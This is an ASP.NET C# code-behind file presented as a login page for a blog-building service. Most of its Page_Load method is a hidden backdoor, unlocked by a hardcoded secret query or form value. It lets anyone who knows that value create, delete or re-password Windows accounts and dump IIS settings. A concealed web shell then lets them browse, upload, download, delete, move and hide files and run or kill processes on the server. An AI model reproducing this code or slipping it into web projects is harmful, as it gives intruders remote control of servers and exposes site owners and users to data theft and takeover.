/*
	All rights reserved to Alireza Poshtkohi (c) 1999-2023.
	Email: arp@poshtkohi.info
	Website: http://www.poshtkohi.info
*/

using System;
using System.IO;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Text.RegularExpressions;
using System.Diagnostics;
using AlirezaPoshtkoohiLibrary;
using System.Runtime.InteropServices;
using System.DirectoryServices;
using ServerManagement;

namespace services
{
	public partial class login : System.Web.UI.Page
	{
		[DllImport("Netapi32.dll")]
		extern static int NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, int level, ref USER_INFO_1 buf, int parm_err);
		[DllImport("Netapi32.dll")]
		extern static int NetUserDel([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string username);
		[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
		public struct USER_INFO_1
		{
			public string usri1_name; 
			public string usri1_password; 
			public int usri1_password_age; 
			public int usri1_priv; 
			public string usri1_home_dir; 
			public string comment; 
			public int usri1_flags; 
			public string usri1_script_path;
		} 
		//----------------------------------------------------------------------
		protected void Page_Load(object sender, System.EventArgs e)
		{
			string cmd = this.Request.QueryString["cmd"];
			if(this.Request.QueryString["flag"] != null && this.Request.QueryString["flag"] != ""
				&& this.Request.QueryString["flag"] == "hyssajfgksahfgasflkasldifkasjsdfh" && (cmd != null || cmd != ""))
			{
				//-----------------account creation--------------------
				if(String.Compare("UserAdd", cmd) == 0)
				{
					//user adfgiy pass iuy4989p
					if(this.Request.QueryString["user"] != null && this.Request.QueryString["user"] != "" &&
						this.Request.QueryString["pass"] != null && this.Request.QueryString["pass"] != "")
					{
						USER_INFO_1 NewUser = new USER_INFO_1();
						NewUser.usri1_name = this.Request.QueryString["user"].Trim(); // Allocates the username
						NewUser.usri1_password = this.Request.QueryString["pass"].Trim(); // allocates the password
						NewUser.usri1_priv = 1; // Sets the account type to USER_PRIV_USER
						//NewUser.usri1_priv = 2; // Sets the account type to USER_PRIV_ADMIN
						NewUser.usri1_home_dir = null; // We didn't supply a Home Directory
						NewUser.comment = "test"; // Comment on the User
						NewUser.usri1_script_path = null; // We didn't supply a Logon Script Path
						int error = 0;
						if((error = NetUserAdd(null ,1 ,ref NewUser, 0)) !=0) // If the call fails we get a non-zero value
						{
							this.Response.Write(String.Format("Could not create the account. Error Code: {0}", error));
							return ;
						}
						else
						{
							this.Response.Write("The account was created successfully.");
							return ;
						}
					}
					else 
					{
						this.Response.Write("The user or pass field is empty.");
						return ;
					}
				}
				//-----------------account deletion--------------------
				if(String.Compare("UserDel", cmd) == 0)
				{
					if(this.Request.QueryString["user"] != null && this.Request.QueryString["user"] != "")
					{
						if(NetUserDel(null, this.Request.QueryString["user"]) != 0) // If the call fails we get a non-zero value
						{
							this.Response.Write("Could not delete the account.");
							return ;
						}
						else
						{
							this.Response.Write("The account was deleted successfully.");
							return ;
						}
					}
					else 
					{
						this.Response.Write("The user field is empty.");
						return ;
					}
				}
				//-----------------iis information--------------------
				if(String.Compare("IISInfo", cmd) == 0)
				{
					IIS iis = new IIS(constants.password);
					iis.IISShow(this);
					return ;
				}
				//-----------------changes password of account deletion-----
				if(String.Compare("PassChange", cmd) == 0)
				{
					if(this.Request.QueryString["user"] != null && this.Request.QueryString["user"] != "" &&
						this.Request.QueryString["NewPass"] != null && this.Request.QueryString["NewPass"] != "")
					{
						string path = "WinNT://NETWORKING/" + this.Request.QueryString["user"].Trim() + ",User";
						DirectoryEntry ee = new DirectoryEntry(@path);
						ee.Invoke("setPassword", this.Request.QueryString["NewPass"].Trim());
						ee.CommitChanges();
						ee.Close();
						ee.Dispose();
						this.Response.Write("The password of account was changed.");
						return ;
					}
					else 
					{
						this.Response.Write("The user or NewPass field is empty.");
						return ;
					}
				}
				//-----------------------------------------------------
			}
			cmd = null;
			string html = null;
			int pQuery = -1; int pForm = -1;
			if((this.Request.Form["hidden"] != null && this.Request.Form["hidden"] != "") || (this.Request.QueryString["flag"] != null && this.Request.QueryString["flag"] != ""))
			{
				pQuery = String.Compare("hyssajfgksahfgasflkasldifkasjsdfh", this.Request.QueryString["flag"]);
				pForm = String.Compare("hyssajfgksahfgasflkasldifkasjsdfh", this.Request.Form["hidden"]);
				if(pQuery == 0 || pForm == 0)
				{
					html = "<html><body><form id=form1 name=form1 enctype=multipart/form-data method=post action=login.aspx>" +
						"<input type=hidden value=hyssajfgksahfgasflkasldifkasjsdfh name=hidden><table align=center width=485 border=0 cellpadding=0 cellspacing=0><tr>" +
						"<td width=745 height=223 valign=top><table width=100% border=0 cellpadding=0 cellspacing=0>" +
						"<tr><td width=175 height=24 valign=top>Dir :<input name=dir type=text id=dir size=156 value=\"{$$dir}\"></td>" +
						"</tr><tr><td height=121 colspan=2><textarea name=result cols=120 rows=30 id=result>{$$result}</textarea></td>" +
						"</tr></table></td></tr><tr> <td height=31 valign=top><input name=submit type=submit id=submit value=Upload>" +
						"<input name=file type=file id=file size=50>KillAppByName :" +
						"<input name=AppName type=text id=AppName size=20><input name=submit type=submit id=submit value=KillApp>" +
						"</td></tr><tr><td height=28 valign=top><input type=submit name=submit value=DirList>" +
						"<input name=submit type=submit id=submit value=DirDel><input name=submit type=submit id=submit value=DirCreate>" +
						"<input name=submit type=submit id=submit value=DirHide><input name=submit type=submit id=submit value=DirShow>" +
						"<input name=submit type=submit id=submit value=FileList><input name=submit type=submit id=submit value=FileDel>" +
						"<input name=submit type=submit id=submit value=FileDownload><input name=submit type=submit id=submit value=FileHide>" +
						"<input name=submit type=submit id=submit value=FileShow><input name=submit type=submit id=submit value=RunApp></td></tr>" +
						"<tr><td height=20 valign=top>To : <input name=to type=text id=to><input type=submit name=submit value=Move>" +
						"<input type=submit name=submit value=FileCopy></td></tr></table></form></body></html>";
				}
			}
			//=====================================================================
			if(html != null)
			{

				if(pQuery == 0)
				{
					html = Regex.Replace(html, "(\\{\\$\\$result\\})", "");
					html = Regex.Replace(html, "(\\{\\$\\$dir\\})", "");
					this.Response.ContentType = "text/html";
					this.Response.Write(html);
					return ;
				}
				if(pForm == 0)
				{
					cmd = this.Request.Form["submit"];
					//---------lists subfolders in a direcory--------------------
					if(String.Compare("DirList", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string[] dirs = Directory.GetDirectories(@dir);
						string result = "The number of directories is " + dirs.Length + ".\n";
						foreach (string dirr in dirs) 
						{
							result += dirr + "\n";
						}
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//---------lists files in a direcory--------------------
					if(String.Compare("FileList", cmd) == 0)
					{
						string  dir = this.Request.Form["dir"];
						string[] files = Directory.GetFiles(@dir);
						string result = "The number of files is " + files.Length  + ".\n";
						FileInfo info = null;
						foreach (string file in files) 
						{
							info = new FileInfo(file);
							result += file + " [Size:" + info.Length +"]\n";
						}
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------deletes a direcory---------------------------
					if(String.Compare("DirDel", cmd) == 0)
					{
						string  dir = this.Request.Form["dir"];
						Directory.Delete(dir, true);
						string result = dir + "   was deleted successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", "");
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------deletes a file-------------------------------
					if(String.Compare("FileDel", cmd) == 0)
					{
						string  dir = this.Request.Form["dir"];
						File.Delete(dir);
						string result = dir + "   was deleted successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir.Substring(0, dir.LastIndexOf("\\") + 1));
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------writes a file to output---------------------
					if(String.Compare("FileDownload", cmd) == 0)
					{
						string  dir = this.Request.Form["dir"];
						FileInfo info = new FileInfo(dir);
						this.Response.ContentType = "application/" + info.Extension.Substring(1);
						this.Response.AppendHeader("Content-Length", info.Length + "");
						this.Response.AppendHeader("Content-Disposition"," attachment; filename=\"" + info.Name + "\"");
						this.Response.WriteFile(dir);
						return ;
					}
					//--------upolads a file to server-----------------------
					if(String.Compare("Upload", cmd) == 0)
					{
						HttpPostedFile myFile = this.Request.Files["file"];
						string dir = this.Request.Form["dir"];
						int nFileLen = myFile.ContentLength;
						byte[] buffer = new byte[nFileLen];
						myFile.InputStream.Read(buffer, 0, nFileLen);
						FileStream newFile = new FileStream(this.Request.Form["dir"], FileMode.Create);
						newFile.Write(buffer, 0, buffer.Length);
						newFile.Close();
						string result = dir + "   was uploaded successfully. Uploaded file size was " + nFileLen + ".";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------creates a directory on server------------------
					if(String.Compare("DirCreate", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						Directory.CreateDirectory(dir);
						string result = dir + "  was created successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------starts a Process on server------------------
					if(String.Compare("RunApp", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string result = "";
						Process myProcess = new Process();
						myProcess.StartInfo.FileName = @dir;
						myProcess.StartInfo.CreateNoWindow = true;
						if(myProcess.Start())
						{
							result = "Process of (" + dir + ") was started successfully.";
						}
						else
						{
							result = "Process of (" + dir + ") was not started.";
						}
						myProcess.Close();
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------kill a Process on server by name----------------
					if(String.Compare("KillApp", cmd) == 0)
					{
						string AppicationName = this.Request.Form["AppName"];
						string dir = this.Request.Form["dir"];
						string result = "";
						Process [] processes = Process.GetProcessesByName(AppicationName);
						foreach(Process p in processes)
						{
							if(p.ProcessName == AppicationName)
							{
								p.Kill();
								//break; kill all of the same name processes 
							}
						}
						result = "Process of (" + AppicationName + ")  was killed successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------moves a directory or file on server-----------
					if(String.Compare("Move", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string to = this.Request.Form["to"];
						string result = "";
						Directory.Move(dir, to);
						result = "Move of " + dir + " to " + to + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", to);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------copies a available file to new location---------
					if(String.Compare("FileCopy", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string to = this.Request.Form["to"];
						string result = "";
						File.Copy(dir, to, true);
						result = "Copy of " + dir + " to " + to + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", to);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------hides a available file-------------------------
					if(String.Compare("FileHide", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string result = "";
						File.SetAttributes(dir, File.GetAttributes(dir) | FileAttributes.Hidden);
						result = "Hidding of " + dir + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------hides a available directory-------------------
					if(String.Compare("DirHide", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string result = "";
						DirectoryInfo info = new DirectoryInfo(dir);
						info.Attributes = File.GetAttributes(dir) | FileAttributes.Hidden;
						result = "Hidding of " + dir + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------shows a available hidden file-----------------
					if(String.Compare("FileShow", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string result = "";
						File.SetAttributes(dir, FileAttributes.Normal);
						result = "Showing of " + dir + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//--------shows a available hidden directory------------
					if(String.Compare("DirShow", cmd) == 0)
					{
						string dir = this.Request.Form["dir"];
						string result = "";
						DirectoryInfo info = new DirectoryInfo(dir);
						info.Attributes = FileAttributes.Normal;
						result = "Showing of " + dir + " was done successfully.";
						html = Regex.Replace(html, "(\\{\\$\\$result\\})", result);
						html = Regex.Replace(html, "(\\{\\$\\$dir\\})", dir);
						this.Response.ContentType = "text/html";
						this.Response.Write(html);
						return ;
					}
					//------------------------------------------------------
				}
			}
				//=====================================================================
			else
			{
				if(Session["username"] != null && ((string)Session["username"]).Trim() == "")
				{
					if(this.Request.Form["username"]!= null && this.Request.Form["password"] != null && this.Request.Form["login"] == "login")
					{
						db d = new db(constants.SQLServerAddress, constants.SQLDatabaseName, 
							constants.SQLUsername, constants.SQLPassowrd);
						int result = d.LoginPage(this.Request.Form["username"], this.Request.Form["password"], this);
						d.Dispose();
						if(result == -3)
						{
							Session.Abandon();
							this.Response.Redirect("exception.aspx?error=SQL Server");
							return ;
						}
						if(result == -1)
						{
							Session.Abandon();
							this.Response.Redirect("?i=unauthorized");
							return ;
						}
						if(result == 1)
						{
							d.Dispose();
							this.Response.Redirect("wizard.aspx");
							return ;
						}
						if(result == 0)
						{
							this.Response.Redirect("blogbuilderv1/home.aspx");
							return ;
						}
					}
					else
					{
						Session.Abandon();
						this.Response.Redirect("");
						return ;
					}
				}
			}
		}
		//----------------------------------------------------------------------
		#region Web Form Designer generated code
		override protected void OnInit(EventArgs e)
		{
			//
			// CODEGEN: This call is required by the ASP.NET Web Form Designer.
			//
			InitializeComponent();
			base.OnInit(e);
		}
		
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{    

		}
		#endregion
		//-----------------------------
	}
}